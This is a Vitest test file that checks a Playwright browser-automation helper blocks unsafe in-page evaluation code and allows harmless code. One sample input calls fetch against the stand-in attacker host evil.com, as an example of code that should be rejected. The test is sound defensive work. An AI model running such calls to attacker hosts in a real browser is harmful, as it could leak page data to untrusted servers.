import { beforeAll, beforeEach, describe, expect, it, vi } from "vitest";

let page: { evaluate: ReturnType<typeof vi.fn> } | null = null;
const getPageForTargetId = vi.fn(async () => {
  if (!page) {
    throw new Error("test: page not set");
  }
  return page;
});
const ensurePageState = vi.fn(() => {});
const restoreRoleRefsForTarget = vi.fn(() => {});
const forceDisconnectPlaywrightForTarget = vi.fn(async () => {});
const refLocator = vi.fn();

vi.mock("./pw-session.js", () => {
  return {
    ensurePageState,
    forceDisconnectPlaywrightForTarget,
    getPageForTargetId,
    refLocator,
    restoreRoleRefsForTarget,
  };
});

let evaluateViaPlaywright: typeof import("./pw-tools-core.interactions.js").evaluateViaPlaywright;

describe("evaluateViaPlaywright unsafe-code blocking", () => {
  beforeAll(async () => {
    ({ evaluateViaPlaywright } = await import("./pw-tools-core.interactions.js"));
  });

  beforeEach(() => {
    vi.clearAllMocks();
    page = {
      evaluate: vi.fn(async () => "ok"),
    };
  });

  it("rejects unsafe evaluate code before page access", async () => {
    await expect(
      evaluateViaPlaywright({
        cdpUrl: "http://127.0.0.1:9222",
        fn: "() => fetch('https://evil.com')",
      }),
    ).rejects.toThrow("Unsafe browser evaluate code blocked");

    expect(getPageForTargetId).not.toHaveBeenCalled();
    expect(page?.evaluate).not.toHaveBeenCalled();
  });

  it("allows safe evaluate code", async () => {
    await expect(
      evaluateViaPlaywright({
        cdpUrl: "http://127.0.0.1:9222",
        fn: "() => 42",
      }),
    ).resolves.toBe("ok");

    expect(getPageForTargetId).toHaveBeenCalledTimes(1);
    expect(page?.evaluate).toHaveBeenCalledTimes(1);
  });
});
